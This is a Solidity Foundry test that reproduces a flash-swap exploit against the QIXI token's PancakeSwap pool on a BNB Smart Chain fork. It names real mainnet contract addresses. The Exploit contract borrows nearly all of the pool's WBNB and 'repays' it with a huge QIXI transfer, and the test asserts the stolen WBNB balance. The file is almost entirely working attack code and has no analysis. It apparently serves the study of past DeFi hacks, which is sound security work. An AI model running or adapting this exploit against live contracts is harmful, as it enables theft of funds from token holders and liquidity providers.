pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IWBNB {
    function balanceOf(address) external view returns (uint256);
}
interface IQIXI{
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
}

contract Exploit is DSTest,IPancakeCallee{
    IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair lp = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IQIXI qixi = IQIXI(0x65F11B2de17c4af7A8f70858D6CcB63AAC215697);

    function Start() public payable{    
        lp.swap(0, wbnb.balanceOf(address(lp)) - 1e15, address(this), bytes("0"));
    }   
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) override external{
        qixi.transfer(address(lp), 999999999999999e18);
    }
}

contract test is DSTest{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 20120884);
    }
    function testExploit() public {
        exploit = new Exploit();
        exploit.Start();
        verfiy();
    }

    function verfiy() public {
        assertGt(IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(exploit)), 6e18);
    }
}